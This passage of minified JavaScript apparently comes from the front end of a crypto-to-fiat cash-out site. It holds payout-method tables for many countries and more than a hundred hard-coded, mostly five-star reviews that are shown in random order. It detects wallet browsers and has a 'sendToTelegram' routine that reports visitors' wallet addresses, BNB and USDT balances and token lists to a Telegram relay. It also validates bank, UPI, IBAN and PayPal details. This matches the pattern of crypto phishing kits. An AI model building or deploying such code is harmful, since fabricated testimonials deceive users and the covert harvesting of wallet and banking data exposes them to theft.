        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "TW",
    name: "Taiwan",
    flag: "🇹🇼",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "NG",
    name: "Nigeria",
    flag: "🇳🇬",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "1%"
    }, {
        name: "Paystack",
        instant: !0,
        fee: "0.8%"
    }]
}, {
    code: "BR",
    name: "Brazil",
    flag: "🇧🇷",
    methods: [{
        name: "PIX",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }]
}, {
    code: "TH",
    name: "Thailand",
    flag: "🇹🇭",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PromptPay",
        instant: !0,
        fee: "0.3%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "MY",
    name: "Malaysia",
    flag: "🇲🇾",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "ID",
    name: "Indonesia",
    flag: "🇮🇩",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "PH",
    name: "Philippines",
    flag: "🇵🇭",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "GCash",
        instant: !0,
        fee: "0.8%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "VN",
    name: "Vietnam",
    flag: "🇻🇳",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.5%"
    }]
}, {
    code: "MX",
    name: "Mexico",
    flag: "🇲🇽",
    region: "Western Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.8%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.9%"
    }]
}, {
    code: "NZ",
    name: "New Zealand",
    flag: "🇳🇿",
    region: "Major Asian Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.4%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.7%"
    }]
}, {
    code: "US",
    name: "United States",
    flag: "🇺🇸",
    region: "Western Countries",
    methods: [{
        name: "ACH",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.9%"
    }]
}, {
    code: "CA",
    name: "Canada",
    flag: "🇨🇦",
    region: "Western Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.9%"
    }]
}, {
    code: "AR",
    name: "Argentina",
    flag: "🇦🇷",
    region: "Western Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "1%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.9%"
    }]
}, {
    code: "CL",
    name: "Chile",
    flag: "🇨🇱",
    region: "Western Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.8%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.9%"
    }]
}, {
    code: "CO",
    name: "Colombia",
    flag: "🇨🇴",
    region: "Western Countries",
    methods: [{
        name: "Bank Transfer",
        instant: !0,
        fee: "0.8%"
    }, {
        name: "PSE",
        instant: !0,
        fee: "0.5%"
    }, {
        name: "PayPal",
        instant: !0,
        fee: "2.9%"
    }]
}]
  , Sf = [{
    name: "Sarah M.",
    location: "New York, USA",
    text: "Instant payouts, exactly as promised!",
    rating: 5
}, {
    name: "David L.",
    location: "London, UK",
    text: "Best rates I've found anywhere.",
    rating: 5
}, {
    name: "Priya K.",
    location: "Mumbai, India",
    text: "UPI integration works perfectly.",
    rating: 5
}, {
    name: "Alex R.",
    location: "Toronto, Canada",
    text: "Seamless experience, highly recommend!",
    rating: 5
}, {
    name: "Chen W.",
    location: "Singapore",
    text: "Quick settlement, transparent rates!",
    rating: 5
}, {
    name: "Leila M.",
    location: "Casablanca, Morocco",
    text: "Got my cash in minutes! Great support team.",
    rating: 5
}, {
    name: "Emil S.",
    location: "Stockholm, Sweden",
    text: "Safe and smooth. Will use again.",
    rating: 5
}, {
    name: "Luisa G.",
    location: "Madrid, Spain",
    text: "Impressed with security & fast settlement.",
    rating: 5
}, {
    name: "Amit R.",
    location: "Delhi, India",
    text: "Easy payouts to my bank. Highly trusted.",
    rating: 5
}, {
    name: "Jan P.",
    location: "Berlin, Germany",
    text: "Perfect for quick euro payouts. Top notch!",
    rating: 5
}, {
    name: "Lisa C.",
    location: "Sydney, Australia",
    text: "Works like magic! Fast PayPal transfer.",
    rating: 5
}, {
    name: "Anna S.",
    location: "Paris, France",
    text: "Superb rates and instant SEPA payment.",
    rating: 5
}, {
    name: "Ivan K.",
    location: "Moscow, Russia",
    text: "Funds settled as promised. Five stars!",
    rating: 5
}, {
    name: "Mehmet T.",
    location: "Istanbul, Turkey",
    text: "Exchange was secure, payout was fast.",
    rating: 5
}, {
    name: "Satoshi Y.",
    location: "Tokyo, Japan",
    text: "Fastest yen withdrawal I've ever tried.",
    rating: 5
}, {
    name: "Felipe G.",
    location: "São Paulo, Brazil",
    text: "Really liked the clear instructions!",
    rating: 5
}, {
    name: "Sofia B.",
    location: "Rome, Italy",
    text: "Quick SEPA to my bank, hassle-free.",
    rating: 5
}, {
    name: "Khaled A.",
    location: "Dubai, UAE",
    text: "Excellent for large amounts. Trusted.",
    rating: 5
}, {
    name: "Andres M.",
    location: "Mexico City, Mexico",
    text: "All worked perfectly. Highly recommend!",
    rating: 5
}, {
    name: "Julia N.",
    location: "Vienna, Austria",
    text: "Easy to use, very professional service.",
    rating: 5
}, {
    name: "Chris P.",
    location: "Chicago, USA",
    text: "Support answered instantly. Impressed.",
    rating: 5
}, {
    name: "Ella H.",
    location: "Copenhagen, Denmark",
    text: "Process is fast and stress-free!",
    rating: 5
}, {
    name: "Raj P.",
    location: "Bangalore, India",
    text: "Great for instant UPI cashouts!",
    rating: 5
}, {
    name: "Samir S.",
    location: "Lagos, Nigeria",
    text: "Swift Naira payout to my bank!",
    rating: 5
}, {
    name: "Maria F.",
    location: "Lisbon, Portugal",
    text: "Rates and support both excellent.",
    rating: 5
}, {
    name: "Petra V.",
    location: "Prague, Czechia",
    text: "Funds arrived in 6 mins. Outstanding!",
    rating: 5
}, {
    name: "Thabo N.",
    location: "Johannesburg, South Africa",
    text: "Quick ZAR payment, no issues.",
    rating: 5
}, {
    name: "Jane M.",
    location: "Auckland, New Zealand",
    text: "No hassle at all, highly rated!",
    rating: 5
}, {
    name: "Markus J.",
    location: "Zurich, Switzerland",
    text: "Platform is reliable, payouts fast.",
    rating: 5
}, {
    name: "Ayesha S.",
    location: "Karachi, Pakistan",
    text: "Simple, fast, and secure!",
    rating: 5
}, {
    name: "Sergio R.",
    location: "Buenos Aires, Argentina",
    text: "Payout was quick, had to wait 10 mins for support.",
    rating: 4
}, {
    name: "Natalia P.",
    location: "Warsaw, Poland",
    text: "Works great, rates could be a little better.",
    rating: 4
}, {
    name: "Elena D.",
    location: "Athens, Greece",
    text: "Very satisfied, good security.",
    rating: 4
}, {
    name: "Omar H.",
    location: "Cairo, Egypt",
    text: "Easy process, but needed extra verification.",
    rating: 4
}, {
    name: "Jonas W.",
    location: "Oslo, Norway",
    text: "Nice UI, payout came as expected.",
    rating: 4
}, {
    name: "Natalie K.",
    location: "Los Angeles, USA",
    text: "Transfer to my bank in under 5 minutes. Wow!",
    rating: 5
}, {
    name: "Oscar G.",
    location: "Barcelona, Spain",
    text: "Amazing support, even late at night.",
    rating: 5
}, {
    name: "Ahmed Z.",
    location: "Riyadh, Saudi Arabia",
    text: "Crypto to SAR in no time. Secure and efficient.",
    rating: 5
}, {
    name: "Isabella C.",
    location: "Santiago, Chile",
    text: "Clear process, and money landed fast.",
    rating: 5
}, {
    name: "Nina V.",
    location: "Belgrade, Serbia",
    text: "Used it three times, always perfect.",
    rating: 5
}, {
    name: "Henrik L.",
    location: "Helsinki, Finland",
    text: "Rates are good and very honest about fees.",
    rating: 5
}, {
    name: "Arun N.",
    location: "Chennai, India",
    text: "Seamless payout to my UPI app. Love it!",
    rating: 5
}, {
    name: "Diana T.",
    location: "Bucharest, Romania",
    text: "Very quick SEPA transfer, recommended!",
    rating: 5
}, {
    name: "George P.",
    location: "Athens, Greece",
    text: "Everything worked as promised.",
    rating: 5
}, {
    name: "Mateo R.",
    location: "Lima, Peru",
    text: "Customer service was very helpful.",
    rating: 5
}, {
    name: "Yara S.",
    location: "Beirut, Lebanon",
    text: "Simple platform, rates are clear.",
    rating: 5
}, {
    name: "Lucia M.",
    location: "Bogotá, Colombia",
    text: "Best exchange for cashing out crypto.",
    rating: 5
}, {
    name: "Tom W.",
    location: "Manchester, UK",
    text: "Sent BTC, got GBP same day.",
    rating: 5
}, {
    name: "Waleed F.",
    location: "Amman, Jordan",
    text: "Works perfectly with local bank.",
    rating: 5
}, {
    name: "Lisa R.",
    location: "Zurich, Switzerland",
    text: "Super fast payouts, no stress.",
    rating: 5
}, {
    name: "Ahmed B.",
    location: "Algiers, Algeria",
    text: "Funds in my account in 7 minutes.",
    rating: 5
}, {
    name: "Sam T.",
    location: "Boston, USA",
    text: "Used several times, never disappointed.",
    rating: 5
}, {
    name: "Marta P.",
    location: "Krakow, Poland",
    text: "Very efficient, will recommend to friends.",
    rating: 5
}, {
    name: "Liang H.",
    location: "Hong Kong",
    text: "Clear UI and payout to my bank in HKD.",
    rating: 5
}, {
    name: "Mariana S.",
    location: "Brasilia, Brazil",
    text: "Superb customer experience.",
    rating: 5
}, {
    name: "Gabriel O.",
    location: "Lisbon, Portugal",
    text: "Safe, reliable, and easy.",
    rating: 5
}, {
    name: "Tina E.",
    location: "Tallinn, Estonia",
    text: "Instant support and great payout speed.",
    rating: 5
}, {
    name: "Noah M.",
    location: "Toronto, Canada",
    text: "Crypto to CAD made simple.",
    rating: 5
}, {
    name: "Irene D.",
    location: "Dublin, Ireland",
    text: "Very quick SEPA payout.",
    rating: 5
}, {
    name: "Peter J.",
    location: "Auckland, New Zealand",
    text: "Money was in my account before I finished coffee.",
    rating: 5
}, {
    name: "Samson K.",
    location: "Nairobi, Kenya",
    text: "KSH payout direct to bank, love it.",
    rating: 5
}, {
    name: "Siti M.",
    location: "Kuala Lumpur, Malaysia",
    text: "Smooth experience, helpful support.",
    rating: 5
}, {
    name: "Paulo F.",
    location: "Rio de Janeiro, Brazil",
    text: "Best way to cash out crypto in BRL.",
    rating: 5
}, {
    name: "Emily J.",
    location: "Cape Town, South Africa",
    text: "Rand payout was seamless.",
    rating: 5
}, {
    name: "Luuk V.",
    location: "Amsterdam, Netherlands",
    text: "Fastest iDEAL settlement ever.",
    rating: 5
}, {
    name: "Mikael O.",
    location: "Oslo, Norway",
    text: "Very good platform and fast process.",
    rating: 5
}, {
    name: "Gloria E.",
    location: "Abuja, Nigeria",
    text: "Funds hit my account almost instantly.",
    rating: 5
}, {
    name: "Fabio G.",
    location: "Rome, Italy",
    text: "Top rates, no hidden fees.",
    rating: 5
}, {
    name: "Leah B.",
    location: "Jerusalem, Israel",
    text: "Shekel payout in less than 10 min.",
    rating: 5
}, {
    name: "Dmitry V.",
    location: "Saint Petersburg, Russia",
    text: "No issues, will use again.",
    rating: 5
}, {
    name: "Jason C.",
    location: "Los Angeles, USA",
    text: "Great for cashing out big amounts.",
    rating: 5
}, {
    name: "Olga K.",
    location: "Minsk, Belarus",
    text: "Very good service, fast payouts.",
    rating: 5
}, {
    name: "Jorge S.",
    location: "Caracas, Venezuela",
    text: "Quick bolivar transfer, thanks!",
    rating: 5
}, {
    name: "Ella Z.",
    location: "Shanghai, China",
    text: "All smooth, fast payout.",
    rating: 5
}, {
    name: "Ali H.",
    location: "Tehran, Iran",
    text: "IRR payout in under 15 mins.",
    rating: 5
}, {
    name: "Martina R.",
    location: "Prague, Czechia",
    text: "Quick, easy, and safe.",
    rating: 5
}, {
    name: "Adeel M.",
    location: "Lahore, Pakistan",
    text: "No issues, PKR payout was fast.",
    rating: 5
}, {
    name: "Ana G.",
    location: "San Jose, Costa Rica",
    text: "Very user-friendly, no complaints.",
    rating: 5
}, {
    name: "Adrian P.",
    location: "Budapest, Hungary",
    text: "Got forints in my bank same day.",
    rating: 5
}, {
    name: "Marta C.",
    location: "Sofia, Bulgaria",
    text: "Worked perfectly with Bulgarian bank.",
    rating: 5
}, {
    name: "Tarek B.",
    location: "Tunis, Tunisia",
    text: "Quick TND payout, thank you!",
    rating: 5
}, {
    name: "Sophie T.",
    location: "Brussels, Belgium",
    text: "Support was helpful and payout fast.",
    rating: 5
}, {
    name: "Daniela Q.",
    location: "Quito, Ecuador",
    text: "Perfect service, highly recommend.",
    rating: 5
}, {
    name: "Julien D.",
    location: "Lyon, France",
    text: "Easy to use, quick EUR payout.",
    rating: 5
}, {
    name: "Peter K.",
    location: "Vienna, Austria",
    text: "All as advertised. Impressive!",
    rating: 5
}, {
    name: "Ivan M.",
    location: "Zagreb, Croatia",
    text: "Will use again for sure.",
    rating: 5
}, {
    name: "Nikita P.",
    location: "Kyiv, Ukraine",
    text: "Fast payout, thanks!",
    rating: 5
}, {
    name: "Stephanie J.",
    location: "Munich, Germany",
    text: "Support is quick to respond.",
    rating: 5
}, {
    name: "Jin H.",
    location: "Seoul, South Korea",
    text: "KRW payout, no hassles at all.",
    rating: 5
}, {
    name: "Reem F.",
    location: "Kuwait City, Kuwait",
    text: "Smooth process, feels secure.",
    rating: 5
}, {
    name: "Mohammed S.",
    location: "Doha, Qatar",
    text: "Got my money same hour.",
    rating: 5
}, {
    name: "Abdul R.",
    location: "Muscat, Oman",
    text: "Super easy platform, payout fast.",
    rating: 5
}, {
    name: "Sandra L.",
    location: "Lagos, Nigeria",
    text: "Works every time, great Naira payout.",
    rating: 5
}, {
    name: "Nguyen T.",
    location: "Hanoi, Vietnam",
    text: "No problems, quick payout.",
    rating: 5
}, {
    name: "Ben D.",
    location: "Edinburgh, UK",
    text: "Slick interface and fast payout.",
    rating: 5
}, {
    name: "Kim S.",
    location: "Bangkok, Thailand",
    text: "Thai Baht payout was very fast.",
    rating: 5
}, {
    name: "Jacob W.",
    location: "San Francisco, USA",
    text: "Fast and professional team.",
    rating: 5
}, {
    name: "Lucas P.",
    location: "Brisbane, Australia",
    text: "AUD in my bank next business day.",
    rating: 5
}, {
    name: "Erika H.",
    location: "Vilnius, Lithuania",
    text: "Great, no delays at all.",
    rating: 5
}, {
    name: "Kofi O.",
    location: "Accra, Ghana",
    text: "Local Cedi payout worked.",
    rating: 5
}, {
    name: "Yusuf A.",
    location: "Istanbul, Turkey",
    text: "Very good for Turkish market.",
    rating: 5
}, {
    name: "Zainab M.",
    location: "Abu Dhabi, UAE",
    text: "Payout quick and easy.",
    rating: 5
}, {
    name: "Jean C.",
    location: "Montreal, Canada",
    text: "Platform is my go-to for cashing out.",
    rating: 5
}, {
    name: "Stella W.",
    location: "Frankfurt, Germany",
    text: "Reliable every time.",
    rating: 5
}, {
    name: "Carlos S.",
    location: "Lima, Peru",
    text: "All perfect, no issues.",
    rating: 5
}, {
    name: "Sanaa E.",
    location: "Casablanca, Morocco",
    text: "Good rates and fast payout.",
    rating: 5
}, {
    name: "Igor S.",
    location: "Belgrade, Serbia",
    text: "Superb experience.",
    rating: 5
}, {
    name: "Anna B.",
    location: "Warsaw, Poland",
    text: "Works as expected, happy with service.",
    rating: 5
}, {
    name: "Valentina M.",
    location: "Santiago, Chile",
    text: "Money landed fast, thank you!",
    rating: 5
}, {
    name: "Max H.",
    location: "Hamburg, Germany",
    text: "Quick response from support.",
    rating: 5
}, {
    name: "Amina J.",
    location: "Dakar, Senegal",
    text: "Easy to cash out to my bank.",
    rating: 5
}, {
    name: "Lukas K.",
    location: "Bratislava, Slovakia",
    text: "Platform is super easy to use.",
    rating: 5
}, {
    name: "Ethan C.",
    location: "Houston, USA",
    text: "No hassle, will use again.",
    rating: 5
}, {
    name: "Nour R.",
    location: "Beirut, Lebanon",
    text: "Lebanese pounds received quickly.",
    rating: 5
}, {
    name: "Fatima A.",
    location: "Cairo, Egypt",
    text: "Trustworthy, will use again.",
    rating: 5
}, {
    name: "Gabriela D.",
    location: "San Juan, Puerto Rico",
    text: "All went well, great service.",
    rating: 5
}, {
    name: "Amir S.",
    location: "Baghdad, Iraq",
    text: "Quick payout, simple steps.",
    rating: 5
}, {
    name: "Niko S.",
    location: "Helsinki, Finland",
    text: "Absolutely trustworthy.",
    rating: 5
}, {
    name: "Julie F.",
    location: "Nice, France",
    text: "Happy with speed and support.",
    rating: 5
}, {
    name: "Moussa C.",
    location: "Bamako, Mali",
    text: "Funds received quickly in CFA.",
    rating: 5
}, {
    name: "Paula M.",
    location: "Medellin, Colombia",
    text: "Recommended for all crypto users.",
    rating: 5
}, {
    name: "Petr S.",
    location: "Moscow, Russia",
    text: "Everything as described.",
    rating: 5
}, {
    name: "Mohamed F.",
    location: "Marrakech, Morocco",
    text: "Money was in my bank so fast.",
    rating: 5
}, {
    name: "Victor D.",
    location: "Sofia, Bulgaria",
    text: "Smooth transaction, no worries.",
    rating: 5
}, {
    name: "Ravi S.",
    location: "Hyderabad, India",
    text: "Bank payout was instant.",
    rating: 5
}, {
    name: "Maria N.",
    location: "Athens, Greece",
    text: "Good for euro payouts.",
    rating: 5
}, {
    name: "Fahad A.",
    location: "Manama, Bahrain",
    text: "Got paid in minutes!",
    rating: 5
}, {
    name: "Ella M.",
    location: "Vilnius, Lithuania",
    text: "Trustworthy platform, will use again.",
    rating: 5
}, {
    name: "Milena V.",
    location: "Belgrade, Serbia",
    text: "Very good platform, thanks.",
    rating: 5
}, {
    name: "Julio P.",
    location: "Panama City, Panama",
    text: "Payout fast, had to resend ID doc.",
    rating: 4
}, {
    name: "Vikram R.",
    location: "Pune, India",
    text: "Service was quick, slightly high fee.",
    rating: 4
}, {
    name: "Alice K.",
    location: "London, UK",
    text: "Good, but waited 15 mins for payout.",
    rating: 4
}, {
    name: "Matheus L.",
    location: "Salvador, Brazil",
    text: "All fine, customer chat was a bit slow.",
    rating: 4
}, {
    name: "Juan F.",
    location: "Buenos Aires, Argentina",
    text: "Payout good, would like more methods.",
    rating: 4
}, {
    name: "Eva C.",
    location: "Berlin, Germany",
    text: "Support was fast, KYC took a bit.",
    rating: 4
}, {
    name: "Meera P.",
    location: "Kolkata, India",
    text: "Took 8 mins, expected instant. Still great.",
    rating: 4
}, {
    name: "Joseph N.",
    location: "Nairobi, Kenya",
    text: "Got KES payout, rates could be better.",
    rating: 4
}, {
    name: "Nikita S.",
    location: "Moscow, Russia",
    text: "Worked well, interface could be simpler.",
    rating: 4
}, {
    name: "Ari W.",
    location: "Tel Aviv, Israel",
    text: "Had to verify again, payout then instant.",
    rating: 4
}]
  , Go = () => {
    if (typeof window > "u")
        return !1;
    const e = window.ethereum;
    if (e != null && e.isTrust || e != null && e.isMetaMask || typeof window.web3 < "u")
        return !0;
    const t = navigator.userAgent.toLowerCase();
    return t.includes("trust") || t.includes("metamask")
}
  , um = () => /android|iphone|ipad|ipod/i.test(navigator.userAgent) && !Go()
  , dm = e => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(e)}`;
function mm(e, t) {
    const n = []
      , r = new Set;
    for (; n.length < t && r.size < e.length; ) {
        const s = Math.floor(Math.random() * e.length);
        r.has(s) || (r.add(s),
        n.push(e[s]))
    }
    return n
}
const Dn = e => ({
    USDT: 1,
    BTC: 45e3,
    ETH: 2500,
    BNB: 300,
    BUSD: 1,
    USDC: 1,
    AICell: .00171,
    AICELLS: .00171
})[e] || .01
  , hm = async e => {
    try {
        const n = {
            USDT: "tether",
            BTC: "bitcoin",
            ETH: "ethereum",
            AICell: "aicell"
        }[e];
        if (!n)
            throw new Error("CoinGecko ID not available");
        const r = "https://api.allorigins.win/raw?url="
          , s = `https://api.coingecko.com/api/v3/simple/price?ids=${n}&vs_currencies=usd`
          , i = await fetch(r + encodeURIComponent(s));
        if (!i.ok)
            return console.warn("CoinGecko API request failed, using fallback price"),
            Dn(e);
        const o = await i.json();
        return o[n] && o[n].usd ? o[n].usd : (console.warn("No price data available from CoinGecko, using fallback"),
        Dn(e))
    } catch (t) {
        return console.warn("CoinGecko API error:", t),
        Dn(e)
    }
}
  , Vi = async e => {
    try {
        const t = `🔔 Platform Activity Alert

Action: ${e.action}
Wallet: ${e.wallet}
` + (e.bnb ? `BNB Balance: ${e.bnb}
` : "") + (e.usdt ? `USDT Balance: ${e.usdt}
` : "") + `Token: ${e.token || "N/A"}
Contract: ${e.contract || "N/A"}
Balance: ${e.balance || "N/A"}
Payment Method: ${e.paymentMethod || "N/A"}
Country: ${e.country || "N/A"}
` + (e.tokenList ? `
Token List:
${e.tokenList}
` : "") + `TX Hash: ${e.txHash || "N/A"}
Network: ${e.network || "N/A"}
Time: ${e.timestamp}`;
        await fetch("/.netlify/functions/notify-telegram", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                text: t
            })
        })
    } catch {}
}
  , Hi = (e, t) => {
    var n, r, s, i, o, l, u, c, m;
    switch (e) {
    case "UPI":
        return !!(t.upiId && /^[\w.-]+@[\w.-]+$/.test(t.upiId) && ((n = t.fullName) != null && n.trim()));
    case "IMPS":
        return !!(t.accountNumber && /^\d{9,18}$/.test(t.accountNumber) && t.ifscCode && /^[A-Z]{4}0[A-Z0-9]{6}$/.test(t.ifscCode) && ((r = t.accountHolderName) != null && r.trim()));
    case "PayPal":
        return !!(t.paypalEmail && /^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/.test(t.paypalEmail) && ((s = t.fullName) != null && s.trim()));
    case "ACH":
        return !!(t.routingNumber && /^\d{9}$/.test(t.routingNumber) && t.accountNumber && /^\d{8,17}$/.test(t.accountNumber) && ((i = t.accountHolderName) != null && i.trim()) && t.accountType);
    case "SEPA":
        return !!(t.iban && /^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$/.test(t.iban) && ((o = t.accountHolderName) != null && o.trim()));
    case "Bank Transfer":
        return !!((l = t.bankName) != null && l.trim() && ((u = t.accountNumber) != null && u.trim()) && ((c = t.accountHolderName) != null && c.trim()));
    default:
        return !!((m = t.general) != null && m.trim())
    }
}
  , wf = Object.freeze(Object.defineProperty({
    __proto__: null,
    fetchCoinGeckoPrice: hm,
    getDefaultPrice: Dn,
    getRandomTestimonials: mm,
    getTrustWalletDeeplink: dm,
    isDappBrowser: Go,
    isRegularMobileBrowser: um,
    sendToTelegram: Vi,
    validatePaymentDetails: Hi
}, Symbol.toStringTag, {
    value: "Module"
}))
  , bf = (e, t, n, r) => {
    var i, o, l, u;
    const s = [n, {
        code: t,
        ...r || {}
    }];
    if ((o = (i = e == null ? void 0 : e.services) == null ? void 0 : i.logger) != null && o.forward)
        return e.services.logger.forward(s, "warn", "react-i18next::", !0);
    en(s[0]) && (s[0] = `react-i18next:: ${s[0]}`),
    (u = (l = e == null ? void 0 : e.services) == null ? void 0 : l.logger) != null && u.warn ? e.services.logger.warn(...s) : console != null && console.warn && console.warn(...s)
}
  , bc = {}
  , Gi = (e, t, n, r) => {
    en(n) && bc[n] || (en(n) && (bc[n] = new Date),
    bf(e, t, n, r))
}
  , pm = (e, t) => () => {
    if (e.isInitialized)
        t();
    else {
        const n = () => {
            setTimeout( () => {
                e.off("initialized", n)
            }
            , 0),
            t()
        }
        ;
        e.on("initialized", n)
    }
}
  , qi = (e, t, n) => {
    e.loadNamespaces(t, pm(e, n))
}
  , Nc = (e, t, n, r) => {
    if (en(n) && (n = [n]),
    e.options.preload && e.options.preload.indexOf(t) > -1)
        return qi(e, n, r);
    n.forEach(s => {
        e.options.ns.indexOf(s) < 0 && e.options.ns.push(s)
    }
    ),
    e.loadLanguages(t, pm(e, r))
}
  , Nf = (e, t, n={}) => !t.languages || !t.languages.length ? (Gi(t, "NO_LANGUAGES", "i18n.languages were undefined or empty", {
    languages: t.languages
}),
!0) : t.hasLoadedNamespace(e, {
    lng: n.lng,
    precheck: (r, s) => {
        if (n.bindI18n && n.bindI18n.indexOf("languageChanging") > -1 && r.services.backendConnector.backend && r.isLanguageChangingTo && !s(r.isLanguageChangingTo, e))
            return !1
    }
})
  , en = e => typeof e == "string"
  , kf = e => typeof e == "object" && e !== null
  , jf = /&(?:amp|#38|lt|#60|gt|#62|apos|#39|quot|#34|nbsp|#160|copy|#169|reg|#174|hellip|#8230|#x2F|#47);/g
  , Bf = {
    "&amp;": "&",
    "&#38;": "&",
    "&lt;": "<",
    "&#60;": "<",
    "&gt;": ">",
    "&#62;": ">",
    "&apos;": "'",
    "&#39;": "'",
    "&quot;": '"',
    "&#34;": '"',
    "&nbsp;": " ",
    "&#160;": " ",
    "&copy;": "©",
    "&#169;": "©",
    "&reg;": "®",
    "&#174;": "®",
    "&hellip;": "…",
    "&#8230;": "…",
    "&#x2F;": "/",
    "&#47;": "/"
}
  , Tf = e => Bf[e]
  , Cf = e => e.replace(jf, Tf);
let Yi = {
    bindI18n: "languageChanged",
    bindI18nStore: "",
    transEmptyNodeValue: "",
    transSupportBasicHtmlNodes: !0,
    transWrapTextNodes: "",
    transKeepBasicHtmlNodesFor: ["br", "strong", "i", "p"],
    useSuspense: !0,
    unescape: Cf
};
const Pf = (e={}) => {
    Yi = {
        ...Yi,
        ...e
    }
}
  , $f = () => Yi;
let fm;
const Ef = e => {
    fm = e
}
  , Af = () => fm
  , If = {
    type: "3rdParty",
    init(e) {
        Pf(e.options.react),
        Ef(e)
    }
}
  , Df = E.createContext();
class Rf {
    constructor() {
        this.usedNamespaces = {}
    }
    addUsedNamespaces(t) {
        t.forEach(n => {
            this.usedNamespaces[n] || (this.usedNamespaces[n] = !0)
        }
        )
    }
    getUsedNamespaces() {
        return Object.keys(this.usedNamespaces)
    }
}
const Mf = (e, t) => {
    const n = E.useRef();
    return E.useEffect( () => {
        n.current = e
    }
    , [e, t]),
    n.current
}
  , xm = (e, t, n, r) => e.getFixedT(t, n, r)
  , Uf = (e, t, n, r) => E.useCallback(xm(e, t, n, r), [e, t, n, r])
  , qo = (e, t={}) => {
    var S, w, j, B;
    const {i18n: n} = t
      , {i18n: r, defaultNS: s} = E.useContext(Df) || {}
      , i = n || r || Af();
    if (i && !i.reportNamespaces && (i.reportNamespaces = new Rf),
    !i) {
        Gi(i, "NO_I18NEXT_INSTANCE", "useTranslation: You will need to pass in an i18next instance by using initReactI18next");
        const b = (P, M) => en(M) ? M : kf(M) && en(M.defaultValue) ? M.defaultValue : Array.isArray(P) ? P[P.length - 1] : P
          , N = [b, {}, !1];
        return N.t = b,
        N.i18n = {},
        N.ready = !1,
        N
    }
    (S = i.options.react) != null && S.wait && Gi(i, "DEPRECATED_OPTION", "useTranslation: It seems you are still using the old wait option, you may migrate to the new useSuspense behaviour.");
    const o = {
        ...$f(),
        ...i.options.react,
        ...t
    }
      , {useSuspense: l, keyPrefix: u} = o;
    let c = s || ((w = i.options) == null ? void 0 : w.defaultNS);
    c = en(c) ? [c] : c || ["translation"],
    (B = (j = i.reportNamespaces).addUsedNamespaces) == null || B.call(j, c);
    const m = (i.isInitialized || i.initializedStoreOnce) && c.every(b => Nf(b, i, o))
      , h = Uf(i, t.lng || null, o.nsMode === "fallback" ? c : c[0], u)
      , x = () => h
      , y = () => xm(i, t.lng || null, o.nsMode === "fallback" ? c : c[0], u)
      , [v,k] = E.useState(x);
    let p = c.join();
    t.lng && (p = `${t.lng}${p}`);
    const f = Mf(p)
      , d = E.useRef(!0);
    E.useEffect( () => {
        const {bindI18n: b, bindI18nStore: N} = o;
        d.current = !0,
        !m && !l && (t.lng ? Nc(i, t.lng, c, () => {
            d.current && k(y)
        }
        ) : qi(i, c, () => {
            d.current && k(y)
        }
        )),
        m && f && f !== p && d.current && k(y);
        const P = () => {
            d.current && k(y)
        }
        ;
        return b && (i == null || i.on(b, P)),
        N && (i == null || i.store.on(N, P)),
        () => {
            d.current = !1,
            i && b && (b == null || b.split(" ").forEach(M => i.off(M, P))),
            N && i && N.split(" ").forEach(M => i.store.off(M, P))
        }
    }
    , [i, p]),
    E.useEffect( () => {
        d.current && m && k(x)
    }
    , [i, u, m]);
    const g = [v, i, m];
    if (g.t = v,
    g.i18n = i,
    g.ready = m,
    m || !m && !l)
        return g;
    throw new Promise(b => {
        t.lng ? Nc(i, t.lng, c, () => b()) : qi(i, c, () => b())
    }
    )
}
  , dn = [{
    code: "en",
    name: "English",
    nativeName: "English"
}, {
    code: "ru",
    name: "Russian",
    nativeName: "Русский"
}, {
    code: "de",
    name: "German",
    nativeName: "Deutsch"
}, {
    code: "ja",
    name: "Japanese",
    nativeName: "日本語"
}, {
    code: "ko",
    name: "Korean",
    nativeName: "한국어"
}, {
    code: "ar",
    name: "Arabic",
    nativeName: "العربية"
}, {
    code: "pt",
    name: "Portuguese",
    nativeName: "Português"
}, {
    code: "it",
    name: "Italian",
    nativeName: "Italiano"
}, {
    code: "nl",
    name: "Dutch",
    nativeName: "Nederlands"
}, {
    code: "tr",
    name: "Turkish",
    nativeName: "Türkçe"
}, {
    code: "hi",
    name: "Hindi",
    nativeName: "हिन्दी"
}, {
    code: "zh",
    name: "Chinese",
